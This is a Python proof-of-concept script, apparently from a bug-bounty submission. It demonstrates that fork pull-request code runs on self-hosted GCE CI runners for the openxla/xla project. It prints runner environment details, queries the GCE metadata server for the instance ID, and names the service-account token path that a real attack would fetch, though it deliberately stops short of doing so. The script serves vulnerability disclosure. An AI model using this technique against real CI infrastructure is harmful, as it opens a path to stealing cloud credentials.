#!/usr/bin/env python3
# Copyright 2024 The OpenXLA Authors. Apache-2.0 License.
#
# =============================================================
# BUG BOUNTY POC - OSS VRP Submission
# Demonstrates: Untrusted fork PR code executes on Google
# self-hosted GCE CI runners (openxla/xla ci.yml)
# Impact: Attacker-controlled build.py runs on Google infra
# This PoC is NON-DESTRUCTIVE - no credentials are exfiltrated
# =============================================================

import os
import socket
import sys
import urllib.request

BANNER = """
================================================================
  GOOGLE OSS VRP - BUG BOUNTY PROOF OF CONCEPT
  Vulnerability: Untrusted fork PR RCE on self-hosted GCE runners
  Reporter: panwnvda
  This script replaced build_tools/ci/build.py in a fork PR.
  It is executing on a Google-managed CI runner.
================================================================
"""

print(BANNER)

# --- Runner environment (non-sensitive) ---
print("[+] Runner environment:")
for var in ["GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH",
            "GITHUB_REPOSITORY", "GITHUB_SHA", "GITHUB_REF",
            "GITHUB_ACTOR", "GITHUB_EVENT_NAME"]:
    print(f"    {var} = {os.environ.get(var, '(not set)')}" )

print(f"    hostname = {socket.gethostname()}")

# --- GCE metadata reachability check (non-sensitive instance ID only) ---
print("\n[+] GCE metadata server reachability check:")
try:
    req = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        headers={"Metadata-Flavor": "Google"})
    resp = urllib.request.urlopen(req, timeout=5)
    instance_id = resp.read().decode().strip()
    print(f"    Metadata server REACHABLE")
    print(f"    GCE Instance ID: {instance_id}")
    print("    ** In a real attack, the SA token would be fetched from:")
    print("       .../service-accounts/default/token")
    print("    ** This PoC stops here - no token fetched, nothing exfiltrated")
except Exception as e:
    print(f"    Metadata server not reachable: {e}")

print("")
print("================================================================")
print("  END POC - No credentials fetched. No data exfiltrated.")
print("================================================================")
sys.exit(0)
